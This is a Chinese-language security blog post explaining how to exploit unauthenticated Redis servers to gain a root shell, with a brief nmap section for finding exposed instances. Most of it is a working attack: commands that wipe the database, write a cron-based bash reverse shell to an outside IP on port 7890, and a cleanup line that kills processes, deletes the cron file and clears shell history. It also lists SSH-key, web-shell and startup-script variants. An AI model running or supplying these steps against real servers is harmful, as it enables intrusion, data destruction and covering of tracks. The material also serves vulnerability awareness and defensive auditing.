---
description: Redis常见的安全问题及利用方式，可以写任意文件并拿到服务器SHELL权限，如何自查Redis匿名访问问题。
---
# Redis GET SHELL

Feei <feei#feei.cn> 2014

## 0x01 漏洞背景
默认Redis安装完成后只能本机访问且没有密码的，一般场景下Redis是需要被其它服务器访问的，所以就会将`/etc/redis.conf`中的`bind-ip`改为`0.0.0.0`，由此导致外网可以匿名访问Redis（不需要密码）。

外网可以访问导致的问题是Redis数据外泄，除此之外若使用root账户启动的Redis则会造成GET SHELL。

## 0x02 利用方式
通过Redis的`config`命令，可以写入任意文件，权限足够的情况下可写入定时任务反弹得到SHELL。

**连上一台Redis**
```bash
redis-cli -h your_redis_server
```

**保持写入的干净，清除原有数据（如果是其它人机器，不建议这么做）**
```bash
flushall
```

**设置key(0)为bash反弹shell的脚本，每分钟执行一次，在自己服务器上监听7890端口(nc -vvl 7890)**
```bash
set 0 "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/103.21.140.84/7890 0>&1\n\n"
```

**设置保存的位置**
```bash
config set dir /var/spool/cron/ 
```

**设置保存的文件名**
```bash
config set dbfilename root
```

**保存**
```bash
save
```

至此就会在目标Redis服务器产生一个Cron文件`/var/spool/cron/root`，如果目标服务器Crond服务没有关闭的话，该文件就会每分钟执行一次导致SHELL，此时只需要在自己的服务器上监听7890端口，即可控制目标服务器。

退出目标服务器时，为了防止Cron再次连接，可以用如下命令退出

```bash
ps aux | grep 7890 | awk '{ print $2 }'|xargs kill;rm -f /var/spool/cron/root;history -c && exit
```

## 0x03 利用姿势

除了可以直接写定时任务拿到SHELL，还可以有多种姿势。

- 写cron反弹一个shell
- 写`~/.ssh/authorized_keys`，使用密钥直接登录
- 找到web目录的绝对路径，直接写web shell
- 写初始化脚本`/etc/profile.d/`
- 主从模式利用

## 0x04 漏洞自测
通过nmap扫描内网网段的redis匿名访问服务。（当然可以扫描外网）
```bash
nmap -p6379 10.11.0/16 --script redis-info
```
就是这个洞让我wooyun排名10天前进10页，当然是加到我的扫描器内（Vulture），自动化利用，每天就看下报告即可。
